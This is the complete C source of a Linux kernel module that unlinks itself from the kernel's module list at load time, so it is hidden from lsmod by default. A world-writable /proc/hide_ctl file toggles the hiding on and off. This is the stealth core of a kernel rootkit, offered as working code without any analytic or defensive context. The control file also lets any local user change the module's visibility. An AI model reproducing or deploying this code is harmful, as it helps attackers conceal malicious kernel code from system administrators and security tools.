#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/list.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h>

static struct list_head *prev_module;
static bool is_hidden = false;
static struct proc_dir_entry *hide_ctl;

static void do_hide(void)
{
    if (is_hidden)
        return;
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    is_hidden = true;
    printk(KERN_INFO "hide_module: hidden from lsmod\n");
}

static void do_unhide(void)
{
    if (!is_hidden)
        return;
    list_add(&THIS_MODULE->list, prev_module);
    is_hidden = false;
    printk(KERN_INFO "hide_module: visible again\n");
}

static ssize_t ctl_write(struct file *f, const char __user *buf,
                          size_t count, loff_t *pos)
{
    char cmd;
    if (copy_from_user(&cmd, buf, 1))
        return -EFAULT;

    if (cmd == '1')
        do_hide();
    else if (cmd == '0')
        do_unhide();

    return count;
}

static const struct proc_ops ctl_fops = {
    .proc_write = ctl_write,
};

static int __init hide_init(void)
{
    printk(KERN_INFO "hide_module: loaded\n");

    hide_ctl = proc_create("hide_ctl", 0222, NULL, &ctl_fops);
    if (!hide_ctl)
        return -ENOMEM;

    do_hide();   // hidden by default at load time

    return 0;
}

static void __exit hide_exit(void)
{
    do_unhide();   // must be visible again before rmmod will find us
    proc_remove(hide_ctl);
    printk(KERN_INFO "hide_module: unloaded\n");
}

module_init(hide_init);
module_exit(hide_exit);

MODULE_LICENSE("GPL");